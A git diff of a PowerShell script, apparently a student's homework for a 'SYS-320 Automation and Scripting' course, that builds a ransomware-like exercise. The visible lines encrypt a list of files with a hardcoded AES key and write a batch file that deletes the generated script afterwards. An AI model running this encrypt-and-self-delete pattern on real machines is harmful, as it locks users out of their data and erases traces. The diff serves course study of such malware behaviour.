@@ -159,10 +159,16 @@ foreach ($f in $filelist) {
     Invoke-AESEncryption -Mode Encrypt -Key "sys320" -Path $f.FullName
 }
 
-Invoke-Expression "D:\Champlain Work\Second Semester\SYS-320 Automation and Scripting\SYS-320_SP22\Week12\update.bat"
+start-process -FilePath "D:\Champlain Work\Second Semester\SYS-320 Automation and Scripting\SYS-320_SP22\Week12\update.bat"
 '@
 
-$step2dir = 'D:\Champlain Work\Second Semester\SYS-320 Automation and Scripting\SYS-320_SP22\Week12\homework\step2.ps1'
+$update = @'
+del "D:\Champlain Work\Second Semester\SYS-320 Automation and Scripting\SYS-320_SP22\Week12\homework\step2.ps1"
+'@
+
+$update | Out-File -File "D:\Champlain Work\Second Semester\SYS-320 Automation and Scripting\SYS-320_SP22\Week12\update.bat"
+
+$step2dir = "D:\Champlain Work\Second Semester\SYS-320 Automation and Scripting\SYS-320_SP22\Week12\homework\step2.ps1"
 Write-Output $step2 | Out-File -File "D:\Champlain Work\Second Semester\SYS-320 Automation and Scripting\SYS-320_SP22\Week12\homework\step2.ps1"
 
 Copy-Item -Path "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Destination "D:\Champlain Work\Second Semester\SYS-320 Automation and Scripting\SYS-320_SP22\Week12"
@@ -200,9 +206,3 @@ else
 {
     Write-Host "Error" 
 }
-
-$update = @'
-del D:\Champlain Work\Second Semester\SYS-320 Automation and Scripting\SYS-320_SP22\Week12\update.bat
-'@
-
-$update | Out-File -File "D:\Champlain Work\Second Semester\SYS-320 Automation and Scripting\SYS-320_SP22\Week12\update.bat"
